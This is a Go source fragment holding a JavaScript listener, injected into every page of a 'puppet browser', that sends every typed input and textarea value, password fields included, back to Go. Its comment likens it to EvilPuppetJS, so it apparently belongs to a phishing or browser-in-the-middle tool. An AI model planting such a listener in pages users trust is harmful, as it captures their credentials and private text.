// inputListenerScript is injected into every document in the puppet browser.
// It watches for input/textarea changes and immediately notifies Go through a binding,
// providing near-instant text synchronization like EvilPuppetJS.
const inputListenerScript = `(function() {
    if (window.__puppetInputListenerAttached) return;
    window.__puppetInputListenerAttached = true;

    function getCssPath(el) {
        if (!(el instanceof Element)) return '';
        var path = [];
        while (el.nodeType === Node.ELEMENT_NODE) {
            var selector = el.nodeName.toLowerCase();
            if (el.id) {
                selector += '#' + el.id;
                path.unshift(selector);
                break;
            } else {
                var sib = el, nth = 1;
                while (sib = sib.previousElementSibling) {
                    if (sib.nodeName.toLowerCase() == selector) nth++;
                }
                if (nth != 1) selector += ':nth-of-type(' + nth + ')';
            }
            path.unshift(selector);
            el = el.parentNode;
        }
        return path.join(' > ');
    }

    document.addEventListener('input', function(e) {
        var tag = e.target.tagName.toLowerCase();
        if (tag === 'input' || tag === 'textarea') {
            try {
                __puppetInputChanged(JSON.stringify({
                    cssPath: getCssPath(e.target),
                    value: e.target.value,
                    selectionStart: e.target.selectionStart || 0,
                    selectionEnd: e.target.selectionEnd || 0
                }));
            } catch(err) {}
        }
    });
})()`
